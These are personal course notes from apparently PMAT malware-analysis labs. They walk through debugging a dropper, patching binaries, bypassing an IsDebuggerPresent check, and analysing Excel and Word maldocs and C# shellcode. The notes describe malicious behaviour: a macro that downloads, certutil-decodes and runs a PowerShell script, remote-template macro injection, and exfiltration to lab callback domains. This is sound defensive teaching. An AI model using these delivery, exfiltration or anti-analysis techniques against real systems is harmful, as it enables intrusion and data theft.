- x32dbg
- x66dbg
### x32dbg - Basic commands
LAB:
`PMAT-labs/labs/2-2.AdvancedDynamicAnalysis/Dropper.DownloadFromURL/Dropper.DownloadFromURL.exe.7z`

It's the same malware -->  as the Basic Static Analysis
=>
we know that:
- if URL exists:
	- download favicon.ico
	- write it to disk (as CR433101.dat.exe)
	- execute favicon.ico (CR433101.dat.exe)
	  
- if URL doesn't exist:
	- delete from disk
	- do not run
=>
- Open x32dbg
- File > Open > All files * > Dropper.DownloadFromURL.exe.malz
![[Pasted image 20240316102450.png]]

Important key features:
`F9` -->  start program  (if you run again it =>  it wil run the entire program)
`F7` -->  step into
`F8` -->  step over
`F2` -->  set a breakpoint
`CTRL+F2` -->  restart the program

=>
- press `F9`
- if you press `F8` =>  you move to the next instruction 
- `EIP` -->  tells us where we are in the program
  ![[Pasted image 20240316103037.png]]
- press `F8` -->  until you reach the first API call
  ![[Pasted image 20240316105439.png]]
- press `F7` -->  to enter inside the API call

### Dynamic Analysis of x86 Instructions & API Calls
Restart the program => `CTRL+F2`
<span style="color:#00b050">START INETSIM ON REMNUX</span>

- press `F9` -->  to start the program
- press F8 until -->  you reach one line that takes more time to execute
	- when you find it -->  set a breakpoint (click on the red circle)
	  ![[Pasted image 20240316113014.png]]
	  =>
	- right click on it > Follow in Disassembler
	- here we find -->  the <span style="color:#00b050">MAIN method</span> 
	- the first API call we find is -->  `InternetOpenW`
		- it takes 5 parameters:
			- 1° one -->  point to address `8A3288`   (that contains Mozilla/5.0)
			- the others --> are `0`
			  ![[Pasted image 20240316113521.png]]
		=>
		- set a breakpoint to the first parameter in the list
		- restart the program (`CTRL+F2`)
		- hit `F9` twice -->  to reach the breakpoint where there is the call for the main method
		- hit `F9` -->  to reach the location with the push parameters into the stack
		- open <span style="color:#00b050">wireshark</span> inside FlareVM > start capturing
		- <span style="background:#fff88f">now we are the point where we need to push the parameters into stack:</span>
			- press `F7` -->  and look at the stack  (bottom right)
			- press `F7` other 3 times  (for now we pushed only `0`)
			- press `F7` -->  we'll push into the stack a real parameter (diverso da 0)
				- we pushed the memory location `8A3288` -->  that contains the string
				                                        Mozilla/5.0
			![[Pasted image 20240316114629.png]]
			
		- press `F7` -->  to jump into the API call
			- now it will open all the instructions that the API needs 
			- =>  press `F8` until you reach the main again
		- press `F8` -->  until you reach the next API call with its params that must be pushed
		  ![[Pasted image 20240316115140.png]]
		  
			- this API is -->  <span style="color:#00b050">URLDownloadToFileW</span> 
			- => push the 5 parameters into the stack -->   by pressing `F7` 5 times
			- NOW:
			- if we press `F8`:
				- it will execute the API =>  <span style="color:#00b050">it will Download the file</span>
				- =>  watch wireshark output
	![[Pasted image 20240316115743.png]]
					_<span style="color:#00b050">we downloaded the favicon.ico file</span>_
			- The next instruction is -->  `test   eax, eax`
			  ![[Pasted image 20240316115855.png]]
			- what `does` test:
				- set a flag in memory -->   if the ended result of the 2 registers is 0
				- if we look at the value of `EAX` in the img -->  is `0`
					- why:
					  bc the <span style="color:#00b050">URLDownloadToFileW</span> -->  it will <span style="color:#00b050">return a boolean value</span>
						  - `0` -->  <span style="color:#00b050">if download is a success</span>
						  - `1` -->  if failure 
				- now it will do -->  the `AND` between `eax` with `eax`
				- if the result is 0 =>  it will<span style="color:#00b050"> set the flag</span> into the memory
				- => press `F8`
				  ![[Pasted image 20240316120611.png]]
				  
			- now the next instruction is a `jump` -->  <span style="color:#00b050">jump IF NOT EQUAL</span>   to `8A1142` address
				- if the flag is not set =>  JUMP
				- here the flag is set =>  it won't jump
			- BUT:
			  <span style="color:#00b050">we can modify the value of the flag</span> -->  by clicking on it double
			  =>
			  in this way -->  it will jump if we press `F7`    (we don't need to do that)
			  it's just to emphasize:
> [!warning]
> remember that inside a debugger -->  we can modify the flow of the program
>                                 (by modifying instructions and flags)

- now:
- skip the next API call (InternetOpenURL) and reach the -->  <span style="color:#00b050">shellExecuteW API call</span> 
	- we have 6 parameters
	- set a breakpoint to the API call
	  ![[Pasted image 20240316121838.png]]
	
	- open procmon
		- filter by -->  Process Name contains DownloadFromURL
		  
	- press `F8` -->  until you run the API
	- watch procmon output -->  to see what happen into the host system
	  _<span style="color:#00b050">at the end we find a CreateFile operation:</span>_
	  ![[Pasted image 20240316122532.png]]
	- it will Execute this file -->  `CR433101.dat`
		- => open the file explorer to this location
		- delete the file
		- <span style="background:#fff88f">we'll try to determine when the file is been created in the host system:</span>
			- restart the program in x32dbg -->  `CTRL+F2`
			- press F9 -->  until you reach the moment where you can push the params into sta
			- then press `F8` -->  until you see that the file is been created
=>
![[Pasted image 20240316123210.png]]

<span style="color:#00b050">The API call to URDownloadToFileW</span> -->  creates the file

- If we press `F8` a few more times -->  we'll reach the `ret`
	- => it will exit from the main
	- after few more F8 -->  it will end the program

#### What remember
From this lecture remember that:
- <span style="color:#00b050">debugger</span> is useful to --> - <span style="color:#00b050">understand</span> what instructions are executed
                        - <span style="color:#00b050">modify the behavio</span><span style="color:#00b050">r</span> of the program (by modifying instruction/reg)
                          
- <span style="color:#00b050">combine</span> the <span style="color:#00b050">debugger</span> with -->  wireshark, procmon, file system check
                             to understand:
                             - <span style="color:#00b050">WHEN THINGS happen</span> to the system
                             - <span style="color:#00b050">WHICH instructions are responsible fo</span><span style="color:#00b050">r</span> 

### Hello World - Part2
LAB:
`PMAT-labs/labs/2-2.AdvancedDynamicAnalysis/helloWorld-c`

- open cutter > open helloworld.exe
- open the main function
- copy the <span style="color:#00b050">memory location</span> -->  where the main starts
  ![[Pasted image 20240316124528.png]]
	- right click on the address > Copy Address

- open x32dbg and open the helloworld
- press `CTRL+G` -->  and paste the address
	- <span style="color:#00b050">we will see the main function into x32dbg</span>

- set a breakpoint to the beginning of the main function (`F2`)
  ![[Pasted image 20240316124925.png]]

- set also a breakpoint to -->  printf CALL
- press `F9` -->  to start the program
- press `F9` again -->  to enter in the main

- press `F7` -->  to start the prologue
  ![[Pasted image 20240316125620.png]]

	- it will push `EBP` -->  into the stack (1)
	- the EBP value is on the right (2)
	- the value inside the stack is on (3)
	- press `F7` -->  move the current stack pointer to the base pointer
	  ![[Pasted image 20240316125906.png]]
	 - press `F7` --> to assure that the stack pointer is a multiple of 4
	 - press `F7` --> to allocate memory for the string
	   ![[Pasted image 20240316130047.png]]
		- <span style="color:#00b050">we are 16 bytes subtracted</span> from the stack pointer
		  
	- press `F8` -->  to execute the call to the debug hello world main function
	- press `F7` -->  <span style="color:#00b050">to move the string hello world into the memory location that's pointed to</span>
	             _<span style="color:#00b050">by the base pointer</span>_
![[Pasted image 20240316130642.png]]
	- press `F8` -->  to call the printf function
	  ![[Pasted image 20240316130800.png]]

####  Modify the hello world string
- restart the program -->  `CTRL+F2`
- press `F9` -->  until you reach the main
- reach the -->  `move` instruction (that copies the string into the address pointed by the EBP)
	- right click on that instruction
	- Follow in dump > `helloworld.<number>`
		- NOW:
		  watch the hexdump section
		- <span style="color:#00b050">it will show the hexadecimal data of the string "Hello, World!"</span>
		- if you underline the String you can see the exact bytes
		  ![[Pasted image 20240316131720.png]]
	- <span style="background:#fff88f">How to modify the String:</span>
		- count the n° of bytes of the string -->  13 bytes
		- right click on the highlighted string > Binary > <span style="color:#00b050">Edit</span>
		  ![[Pasted image 20240316132027.png]]
		
		- modify the string -->  BUT MUST BE ALWAYS 13 bytes
		- click ok
		- press `F8` 3 times -->  to execute the code
		  ![[Pasted image 20240316132212.png]]
<span style="color:#00b050">We have printed a modified string</span> 

#### Print more strings into the binary
If you look at this img -->  there are more strings than the Hello World
![[Pasted image 20240316131720.png]]
=>
<span style="background:#fff88f">let's try to print even them:</span>
- restart the program -->  `CTRL+F2`
- press `F9` -->  until you reach the `move` instruction
- right click on the move instruction > Follow in dump > `helloworld.<number>`
- select everything from:
	- the next Ch after the "!"
	- to the previous Ch before the "U"
	  
- right click > <span style="color:#00b050">Fil</span><span style="color:#00b050">l</span> 
- write the hex ch `90` -->  it's the `NOP` operation
                       it will skip until the last NOP
	![[Pasted image 20240316133012.png]]
	=>
	![[Pasted image 20240316133035.png]]

- press `F8` 3 times -->  to execute the code
  ![[Pasted image 20240316133153.png]]

#### Last instructions and epilogue
- `move  eax, 0` -->   it returns 0 (as in the code)
- `leave` -->  alias for the epilogue
  ![[Pasted image 20240316133644.png]]
	
	- `move   ESP, EBP` -->  move EBP into ESP
	- `pop` `EBP`![[Pasted image 20240316133715.png]]
=>
now:
- if press `F8` again -->  <span style="color:#00b050">we will turn back to the address where the main function is been called</span>
  ![[Pasted image 20240316133856.png]]

	<span style="color:#00b050">That is the address that was inside the stack </span>(so insde the base pointer)

## SikoMode Challenge
### Info
LAB:
`PMAT-labs/labs/2-3.Challenge-SikoMode/unknown.exe.7z`

#### README and Objective
![[Pasted image 20240316134214.png]]

#### Questions
- What language is the binary written in?
- What is the architecture of this binary?
- Under what conditions can you get the binary to delete itself?
- Does the binary persist? If so, how?
- What is the first callback domain?
- Under what conditions can you get the binary to exfiltrate data?
- What is the exfiltration domain?
- How does exfiltration take place?
- What URI is used to exfiltrate data?
- What type of data is exfiltrated (the file is cosmo.jpeg, but how exactly is the file's data transmitted?)
- What kind of encryption algorithm is in use?
- What key is used to encrypt the data?
- What is the significance of `houdini`?

### Basic Static Analysis
#### PeStudio
##### Architecture
![[Pasted image 20240316151909.png]]

##### Strings
![[Pasted image 20240316152114.png]]

##### What language is the binary written in?
The binary is written in Nim. 
you can see it with -->  `floss`
This is also indicated by the existence of the NimMain, NimMainInner, and NimMainModule methods present in the binary.


#### VIRUSTOTAL
Trojan - backdoor

#### Peview
Not packed -->  Virtual size = Raw Data
no IMPORT table??
#### Capa
![[Pasted image 20240316153534.png]]

### Basic Dynamic Analysis
#### Under what conditions can you get the binary to delete itself?
when the malware deletes itself:
- Without InetSim -->  if you run the malware both with admin/no-admin privileges 
- if you stop InetSim -->  while malware executed
- 
When you setup a fake dns server and listen with ncat it also deletes 

#### Wireshark
##### What is the first callback domain?
1) DNS request to:
   `update.ec12-4-109-278-3-ubuntu20-04.local`: type A, class IN
	
 
2) then HTTP request to -->  same URI
                         `http://update.ec12-4-109-278-3-ubuntu20-04.local`
    _<span style="background:#fff88f">FIRST CALLBACK DOMAIN</span>_
##### What URI is used to exfiltrate data?
3) then DNS request to:
   `cdn.altimiter.local`: type A, class IN

4) then HTTP request to:
   `http://cdn.altimiter.local/feed?post=A8E437E8F0367592569A2870BBDD382A1DFBB01A15FC23999D7788C33502AD9256E481B402BDC6BC25167B6478F204C49A9BADD68C4AC2A617437ECCBBA9`
   _<span style="background:#fff88f">THIS IS THE URI</span>_

#### Procmon
##### What key is used to encrypt the data?
![[Pasted image 20240316155423.png]]

It creates a file -->  password.txt

No sub process
#### TCPview
![[Pasted image 20240316154316.png]]

#### Under what conditions can you get the binary to exfiltrate data?
If the malware contacts the initial callback domain successfully:
=> <span style="color:#00b050">exfiltration occurs</span>
After a successful check in with this domain, the sample unpacks the `passwrd.txt` file into `C:\Users\Public\`,  opens a handle to `cosmo.jpeg`, base64 encodes the contents of the file, and begins the data encryption routine.  

### Advanced Static analysis
>[!warning]
>with a nim malware you have to analyze:
>3 main
>![[Pasted image 20240316163359.png]]
>
#### What kind of encryption algorithm is in use?
`RC4` -->  you can find it inside the floss output or in cutter


# Binary Patching & Anti-analysis
## Patching x86 Binaries
LAB
`PMAT-labs\labs\2-4.BinaryPatching\SimplePatchMe`

our goal as malware analyst -->  understand what a malware does
sometimes the malware -->  is <span style="color:#00b050">designed</span> <span style="color:#00b050">to prevent us from accomplishing that goal</span> 
=>
we need to -->  outsmart the malware when this is the case

One technique that we can use is:
<span style="color:#00b050">Binary patching</span> -->  process of making changes to a binary and modify its instruction flow

### Setup
- On FLAREVM  make a copy of `main.exe` called `main2.exe`:
  `cp .\main.exe .\main_2.exe`

- Open in Cutter -->  main2.exe and make sure to click on <span style="color:#00b050">Load in write mode</span> when opening Cutt

### Source Code
First analyze the source code of -->  SimplePatchMe  (`main.nim`)
![[Pasted image 20240317100801.png]]

The program:
- performs a <span style="color:#00b050">GET request</span> to -->  `http://freetshirts.local/key.crt`
- <span style="color:#00b050">write the body of the response</span> -->  into a <span style="color:#00b050">variable</span> (`key_contents`)
- calculates the <span style="color:#00b050">SHA256sum</span> of the body of the response
- <span style="color:#00b050">compares</span> it to a preset value:
	- if the 2 values are = -->    - it executes the `run_payload()`
	                        - it simply prints `[+] Boom!`

	- if not equal -->  it prints `[-] No dice, sorry :(`

### Cutter
With nim malware -->  the main is always nested inside other method
=>
we need to -->  drill down a few leves

- Open `main()` function into `Decompiler` panel:![[Pasted image 20240317101425.png]]

- Open `_NimMain()`:
  ![[Pasted image 20240317101513.png]]

	- we can ignore for now -->  `_PreMain()` and `_initStackBottomWith()`
	- click on the `_NimMainInner` value -->  to jump to the `NimMainInner()` function
	  
- finally we get to the true main() of a Nim program -->  `NimMainModule()`.
![[Pasted image 20240317102436.png]]

The <span style="color:#00b050">symbols of this binary</span> have been left in =>  so the <span style="color:#00b050">function names</span> are nice and <span style="color:#00b050">easy to read</span>
=>
we have -->   `evaluate_http_body()` and `run_payload()`

With the graph view is easier to see:
![[Pasted image 20240317102650.png]]

The call to `evaluate_http_body()` -->  <span style="color:#00b050"> splits this graph into two paths</span>
- 1 path runs the `run_payload()` fz -->   that we saw print `[+] Boom!`
- the other path echoes the other string -->  `[-] No dice, sorry :(`
=>
`jne 0x43f1c0` -->   <span style="color:#00b050">splits the program</span> into two paths
=>
<span style="background:#fff88f">Let’s start at this split and work our way upwards:  </span>             (verso l'alto)
jne -->  <span style="color:#00b050">Jump if Not Equal</span> 
         => 
         Jump if the condition is not met
         which is the <span style="color:#00b050">condition</span> -->  `test al, al`

#### test function
used to perform -->  the logical `bitwise AND` operation on 2 operands. 
In this case:
we are `AND`’ing -->  the contents of `al` against itself
                 (`al` is the lower 8 bits of the `eax` register)

the <span style="color:#00b050">result of the test</span> instruction -->     <span style="color:#00b050">sets the</span> 
                                Zero Flag (`ZF`), Sign Flag (`SF`), and Parity Flag (`PF`) reg 
                                 _<span style="color:#00b050">to certain values</span>_
We'll focus on -->    <span style="color:#00b050">Zero Flag</span> value
                 the value can be -->  `0` or `1`  (based on the previous `AND` operation)
=>
- `if ZF == 0` =>  **JNE instruction will be taken**
-  `if ZF == 1`=>  **JNE instruction will not be taken**

#### XOR
One instruction higher than the `test al, al`:
`xor eax, 1` -->      <span style="color:#00b050">this is the true deciding point in the program</span>
                bc the value of `eax` -->  has been set by the `evaluate_http_body()` function

Remember that -->  `al` is <span style="color:#00b050">the lower 8</span> bits of `eax`

We know that the evaluate_http_body() -->  returns a boolean value
=>
- If the result was TRUE =>   our <span style="color:#00b050">XOR returns a 0</span>
- If the result was FALSE =>  <span style="color:#00b050">XOR returns 1</span> 

And this is evaluated by the -->  `test al, al`

#### Recap
=> 
so far we are:
- Doing the method -->  `evaluate_http_body()`
- Writing the return value of the method -->   to a variable (<span style="color:#00b050">TRUE</span> or <span style="color:#00b050">FALSE</span>)
- <span style="color:#00b050">XOR</span> this result -->  against the value of 1       (`xor eax,1`)
- <span style="color:#00b050">TEST</span> -->  the resulting value of the eax register 
- <span style="color:#00b050">set the Zero Flag</span> -->  based on the result of this TEST (`test al, al`).
- Jump to one side of the code path -->   if ZF == 0
- jump to the other side -->  if ZF == 1                              (`jne [memory address]`)

#### The issue
let's assume for this example:
- the malware calls to `http://freetshirts.local/` 
- grabs the body of the endpoint at -->  `key.crt`
- this endpoint is now -->  <span style="color:#00b050">offline</span>  <span style="color:#00b050">or</span> has been <span style="color:#00b050">changed</span> 

we know that:
the <span style="color:#00b050">payload triggers if</span> the SHA256 sum of the contents of `key.crt` -->  is = to  a pre-defined 
                                                             SHA256 in the binary
<span style="background:#fff88f">what’s the issue</span>
there is <span style="color:#00b050">no way</span> -->  <span style="color:#00b050">we could know</span> the <span style="color:#00b050">contents</span> of that <span style="color:#00b050">endpoint</span> at this point
bc:
- we have a SHA256 hash
- but <span style="color:#00b050">it is impossible to reverse the SHA256</span> sum back into its original contents

=>
we can't trigger the binary and get to `run_payload()` code path

#### The Patch
We’re going to -->   - <span style="color:#00b050">patch this binary</span> 
                 - so it will <span style="color:#00b050">run the payload regardless</span> 
                   of the <span style="color:#00b050">result</span> of the evaluate_http_body() <span style="color:#00b050">function</span>

<span style="background:#fff88f">We have the binary in our machine:</span>
=>
<span style="color:#00b050">we can modify it</span>
=>
basic idea:
- <span style="color:#00b050">insert or alter instructions</span> into the binary 
- so <span style="color:#00b050">it will reach our intended code pat</span><span style="color:#00b050">h</span>  (regardless of how the program is supposed to run)

#### Running and Patching the Exe
add `freetshirts.local` to your `/etc/hosts` file and have it point to `127.0.0.1`
[[Notes_PMAT#Fake DNS reply]]

![[Pasted image 20240317105657.png]]

<span style="background:#fff88f">To patch this we have tons of options:</span>
- make sure that the value is different -->  by the time it hits this XOR instruction
- insert a JMP to jump over this code block completely

But keep it simple:
the opposite of `JNE` -->  is `JE`  (<span style="color:#00b050">Jump if Equal</span> =>  Jump if condition is met)
=>
<span style="color:#00b050">let’s patch this</span> -->  <span style="color:#00b050">by changing</span> the `JNE` instruction to a `JE`
=>
- Select the jne instruction
- right click > Edit > <span style="color:#00b050">Reverse Jump</span> 
  ![[Pasted image 20240317110013.png]]

- Save it and close of cutter   (as rizin project)
- Our Desktop should be like this:
  ![[Pasted image 20240317110258.png]]

NOW:
<span style="color:#00b050">Test</span> the `original malware` and also our `patched malware`:
![[Pasted image 20240317110733.png]]

## Identifying & Defeating Anti-analysis Techniques
LAB:
`PMAT-labs\labs\2-5.AntiAnalysis\1.simpleAntiAnalysis\simpleAntiAnalysis-cpp.exe`
###  Anti-analysis Techniques
broad term for -->  a <span style="color:#00b050">multitude of techniques</span> that malware authors 
                use to <span style="color:#00b050">disrupt the malware analysis process</span>
                
Anti-analysis can be for example `obfuscation`:
where malware samples are filled with -->  junk strings, null byte, and other random detritus.

<span style="background:#fff88f">But more specifically, anti-analysis also means:</span>
when a malware author:
<span style="color:#00b050">puts special code </span>in a malware sample -->  - <span style="color:#00b050">to detect when it is being examined</span> 
                                     -  <span style="color:#00b050">deter the examination</span>
                                       
Malware authors may code their malware to <span style="color:#00b050">identify</span>:
- when it is <span style="color:#00b050">being debugged</span>
- if it is in a <span style="color:#00b050">virtual machine</span>,
- if it is in a <span style="color:#00b050">specific environment</span>    (like FLARE-VM)

#### IsDebugger
Present() API Call
IsDebuggerPresent() API call:
<span style="background:#fff88f">naïve form of anti-analysis technique:</span>
in which the <span style="color:#00b050">malware</span> sample -->  <span style="color:#00b050">detects</span> the presence of a <span style="color:#00b050">debugger</span> 
                             that is <span style="color:#00b050">attached</span> to its <span style="color:#00b050">process</span> 
                             
This technique is -->  quite easy to detect and defeat
but:
it is an excellent introduction to the anti-analysis methodology and how to counter it

=>
- Open `simpleAntiAnalysis-cpp.exe` into Cutter
- This sample is a 64-bit binary written in C++

- Open the `sym.WinMain` function into the `Graph view`
  ![[Pasted image 20240317112417.png]]

let's examine the IsDebuggerPresent() API -->  [windows documentation](https://learn.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-isdebuggerpresent)
![[Pasted image 20240317112918.png]]
=>
It returns a bool value based on -->  the current process IS/IS NOT running with a debugger

The core of the logic of the debugger check is this one:
![[Pasted image 20240317113054.png]]
=>
- Execute the IsDebuggerPresent API
- the result is stored into -->  `EAX`
	- `EAX == 1` -->  if debugger is detected
	- `EAX == 0` -->  if debugger is not detected
	  
- program performs -->  a bitwise `AND` of the value of `EAX`  (will set the Zero Flag (ZF) to `1` or `0`)

##### SETNE instruction
Then the program performs a -->  `SETNE` `AL` instruction

SETNE -->  <span style="color:#00b050">SET if Not Equal To</span> 
=>
`SETNE AL` :
sets the value of `AL` -->  to 1 or 0 <span style="color:#00b050">depending on if the Zero Flag is clear or not</span> 

##### TEST
Finally:
- value of `AL` is `TEST`ed against itself -->  <span style="color:#00b050">sets the ZF to 1 or 0 </span>depending on the contents of `AL`

##### JE jump
last:
`JE` -->  <span style="color:#00b050">Jump if Equal</span> 
=>
- **if the Zero Flag is equal to 1 =>   the jump is taken** (<span style="color:#00b050">Malware is executed</span>)
- if the Zero Flag is equal to 0 =>   the jump is not taken  (<span style="color:#ff9900">Malware is stopped</span>)

##### Recap
- The program calls `IsDebuggerPresent()`
	- If a debugger is present =>  a 1 is stored in `EAX`
	- Otherwise =>  a 0 is stored in `EAX`.
- This value is `TEST`ed against itself
- The value undergoes a bitwise `AND` operation
	- Bitwise `AND` of a 2 values result -->  in a value of 0 if the operands are both 0
	- if this value ends up being 0 =>   the Zero Flag is set.
- `SETNE AL` evaluates the Zero Flag
	- If the Zero Flag is clear =>  `SETNE` sets the value of `AL` to 1
	- In the opposite case =>  it sets the value of `AL` to 0.
- Whatever value is placed in `AL` is `TEST`ed against itself
	- and the Zero Flag is set to 1 or 0 again
- The `JE [memory address]` evaluates the Zero Flag 
	- and jumps to the memory location if it equals 1 
	- proceeds to the other code path if the Zero Flag is 0.

<span style="background:#fff88f">If a debugger is attached:</span>
- IsDebuggerPresent() = 1 -> `EAX = 1`
- `TEST EAX, EAX` (bitwise AND of 1 and 1) -> `1`
- `Zero Flag = 0` (Zero Flag is cleared because the TEST result was not 0)
- `SETNE AL = 1`
- `TEST AL, AL -> 1`
- `Zero Flag = 0`
- `JE` goes to "No Soup For You!"

<span style="background:#fff88f">And in the opposite case:</span>
- IsDebuggerPresent() = 0 -> `EAX = 0`
- `TEST EAX, EAX` (bitwise AND of 0 and 0) -> `0`
- `Zero Flag = 1` (Zero Flag is set because the TEST result was 0)
- `SETNE AL = 0`
- `TEST AL, AL -> 0`
- `Zero Flag = 1`
- `JE` goes to "Boom!"

### Defeating Simple Anti-analysis
Here we'll use an alternative method =>  we'll <span style="color:#00b050">patch the binary DYNAMICALLY</span>  (with x64dbg)

- load the program into x64dbg
- Run the program (`F9`) until the message box triggers![[Pasted image 20240317114819.png]]

<span style="background:#fff88f">Let’s find the instruction that performs the `IsDebuggerPresent()` check:</span>
- restart the program (`CTRL+F2`)
- Start the program (`F9`)
- right click in the main tab with assembly instruction 
	- Search For > All Modules > String References
	- In the String search panel enter -->   `IsDebuggerPresent`
	- set a breakpoint (`F2`) to this string
	- exit from the the String tab  (click in the above tab "CPU")
- continue the execution of the program by pressing `F9` -->  until we reach the breakpoint
  ![[Pasted image 20240317115801.png]]
  
	- continue with `F8` -->  until we can arrive to the <span style="color:#00b050">RETURN FROM THIS CALL</span> (`ret`)
	- set a breakpoint![[Pasted image 20240317120013.png]]
	  
	- <span style="color:#00b050">WE FINALLY REACH THE SAME CODE AS WE SAW IN CUTTER</span> 
	  
- <span style="background:#fff88f">Now we want to modify the flow of the malware</span>
	- press `F8` -->  and reach the JUMP![[Pasted image 20240317120305.png]]
	  
	- here the ZF Zero Flag -->  is set to 0    ([[Notes_PMAT#JE jump|recap jump]])
		- => malware will stop  
			- bc it recognize that we are inside a debugger
	 =>
	- <span style="color:#00b050">change the value of </span>`ZF` -->  by clicking twice on it 

Now:
continue with `F8` -->  to see the output of the program
![[Pasted image 20240317120732.png]]
![[Pasted image 20240317120815.png]]

# Specialty Malware Classes
In this next section:
we'll explore -->  different types of malware and malicious delivery mechanisms

Use this opportunity to -->    - explore different malware mechanisms and 
                        - learn more about the many diff forms a piece of malware can take

## Analyzing Excel Maldocs: OLEdump
LAB:
`PMAT-labs/labs/3-1.GonePhishing-MaldocAnalysis/Excel/sheetsForFinancial.7z`

Here we'll learn about -->  malware inside a file

This example is an excel file:
with `.xlsm` extension -->  `m` stands for MACRO 

- we'll do only static analysis (bc for dynamically we need office suite)
- we'll use REMnux for analysing this malware
  =>
  to copy the file into remnux:
	- set up a http server into FlareVM -->  `python -m http.server 80`
	- retrieve the file with wget -->  `wget http://10.0.0.3/sheetsForFinancial.xlsm`
	- close the http server

<span style="background:#fff88f">When you open a document:</span>
- you are not opening a single file
- is more similar to an -->  <span style="color:#00b050">archive</span>
=>
- indeed we can unzip the document -->  `unzip sheetsForFinancial.xlsm` ![[Pasted image 20240317131055.png]]
- the most interesting file  is -->  `vbaProject.bin`
  bc:
	- it's a `.bin` file
	  =>
	  it contains Raw Byte

	- it's VB -->  can be Visual Basic Script

- if you `cat`  the program =>  you'll see the Raw Byte
- to analyze this file we'll use -->  `oledump.py`

### oledump.py
- oledump.py is a program to analyze `OLE files` (Compound File Binary Format)
- These files contain -->  streams of data
- oledump -->  allows you to analyze these streams
=>
`oledump.py sheetsForFinancial.xlsm`
![[Pasted image 20240317131302.png]]
for each data stream that the tool finds =>  it will give an index (A1, A2, A3...)
=>
here it says that:
- inside the `xl` folder and inside the `vbaProject.bin` file
	- there is a data stream that contains -->   a MACRO    (A3 bc has the `M`)

=>
analyze this data stream:
- `oledump.py -s 3 sheetsForFinancial.xlsm`
  `-s 3` -->  use data stream n° 3 
  =>
  it will return -->  the hex dump of the file   (hard to find something in this)
  =>

- `oledump.py -s 3 -S sheetsForFinancial.xlsm`
  `-S` -->  print the Strings inside the data stream     (it's like using FLOSS)![[Pasted image 20240317125701.png]]
  =>
	- it's running `certutil`
	- it's running a `decode` of something called `encd.crt`
	- it's running `run.ps1`
  =>
  There is probably something malicious 

let's try to:
<span style="background:#fff88f">recover the actual syntax of the macro</span>
- `oledump.py -s 3 --vbadecompresscorrupt sheetsForFinancial.xlsm`
![[Pasted image 20240317130428.png]]
THIS IS -->  <span style="color:#00b050">THE FULL TEXT OF THE MACRO</span>                  (that is embedded into the excel sheet)
=>
the macro:
1) create a HTTP object -->  bc maybe we are trying to reach a web URL
2) we open a GET request to -->  `http://srv3.wonderballfinancial.local/abc123.cr`
3) we write the <span style="color:#00b050">downloaded file</span> to -->  `encd.crt`
4) we call the shell
	1) invoke the `cmd` 
	2) where `certutil` -->  decode the `encd.crt` file
	3) we call the `run.ps1`
	4) invoke the full path to the `PowerShell` at 64 bit
	5) to run the `run.ps1`
  
##  Analyzing Word Maldocs: Remote Template Macro Injection
LAB:
`PMAT-labs/labs/3-1.GonePhishing-MaldocAnalysis/Word/`

2 files:
- `.docm` -->  it's like the excel file =>  contains a <span style="color:#00b050">macro</span> 
- `.docx`

### .docm extension 
is literally the same macro that we saw -->  in the excel example
=>
we can use `oledump.py` even on FlareVM:
- `oledump.py bookReport.docm`![[Pasted image 20240317151349.png]]
- `oledump.py -s 3 --vbadecompresscorrupt bookReport.docm`

### .docx extension
#### Remote template word
we said that -->  a document is like a zip file
=>
- change the extension to the file and write -->  `.zip`
- and you can open it with -->  7zip

this docx file -->  is a word file that use a <span style="color:#00b050">remote template</span> 
<span style="background:#fff88f">the format and settings for a template:</span>
are located inside -->  the `rels` folder          (inside the word zip)
=>
- extract the zip
- open it and go to word > rels > `settings.xml.rels`
- open it with VS code
	- it contains the template specification in XML
		- <span style="color:#00b050">interesting field</span> -->  Target
		  ![[Pasted image 20240317152551.png]]
		_<span style="background:#fff88f">What usually happen:</span>_
		- word download a template
		- stores it into the file system (usually in a directory called `custom word template`)
		- the `Target` field -->  <span style="color:#00b050">points to that location on the file system</span>
		  
	- _<span style="background:#fff88f">Why it's interesting:</span>
		- bc `Target` value -->  <span style="color:#00b050">DOESN'T NECESSARILY BE SOMETHING INTO THE LOCAL FS</span> 
		  
- indeed in the example -->  there is a web resource
- the file that Target points to is a -->  `.dotm`
	- remember that `m` -->  macro
	  =>
- <span style="background:#fff88f"> if the `macro3.dotm` contains a macro:</span>
	- that macro will be <span style="color:#00b050">downloaded</span> when the -->  docx file is opened
	- the macro will <span style="color:#00b050">run</span> 

this macro -->  only spawn the calculator
=>
![[Pasted image 20240317153606.png]]
##### macro3 file
if you open it in word > search for View Macro:
![[Pasted image 20240317153710.png]]

if you click Edit =>  you can see the macros
![[Pasted image 20240317153757.png]]

they just spawn a calc

## Shellcode Analysis
LAB:
`PMAT-labs/labs/3-2.WhatTheShell-ShellcodeAnalysis/CarveFromText`

README:
![[Pasted image 20240317153938.png]]

The file inside the `CarveFromText` -->  is just code in C#  (=> it's not an executable)
=>
we can open it with an editor
![[Pasted image 20240317154804.png]]

<span style="background:#fff88f">if we inspect the API call:</span>
we have a classic -->  <span style="color:#00b050">Thread Injection pattern</span>
=>
- it creates an array -->  `rsrc`
- `VirtualAlloc` -->  allocate memory
- `Copy` -->  copy the bytes from `rsrc` into the `Address`  (that is been allocated with VirtualAlloc)
- `CreateThread` -->  execute a thread that is pointed to the `Address`
	- what is executed:
	  the content inside the -->  `rsrc` array 

- `WaitForSingleObject` -->  puts the thread in a waiting state for an indefinite period of time
	- <span style="background:#fff88f">this is interesting bc:</span>
		- <span style="color:#00b050">the process will never show up into the process list</span> -->   bc it's waiting to the handle
		                                                 for the thread
=>
the malicious code is -->  inside the `rsrc` array 
=>
- copy the entire line with the array
- paste it inside a txt file in the -->  REMnux VM

We need to parse this file

### Parsing file in python
into REMnux VM:
- `nano carve.py`
- we only need the data inside the array
	- => in `0xfc` -->  we need `fc`
- =>![[Pasted image 20240317160542.png]]
  
  it will replace:
	- each `0x` -->  with `""`
	- the start of the line -->  with `""`
	- the `};` -->  with "`"`
	- each `,` -->  with `""`

	![[Pasted image 20240317161009.png]]

- we need the string bytes => modify the script in way:
  
```python
#!/usr/bin/env python3

with open("shellcode.txt", "r") as f:
        hex_string = f.read().replace("0x", "").replace("byte[] rsrc = new byte[464] {", "").replace("};", "").replace(",", "")

        hex_encode = hex_string.encode()

# write the hex_encode variable inside a file
with open("out.bin", "wb") as out:                      #wb = write bytes
        out.write(hex_encode)

```
=>
![[Pasted image 20240317161317.png]]

- transfer it to FlareVM:
  `python3 -m http.server 8080`

- in FlareVM in a powershell
   `wget http://10.0.0.4:8080/out.bin -UseBasicParsing -Outfile out.bin`

### Analyzing  with scdbg
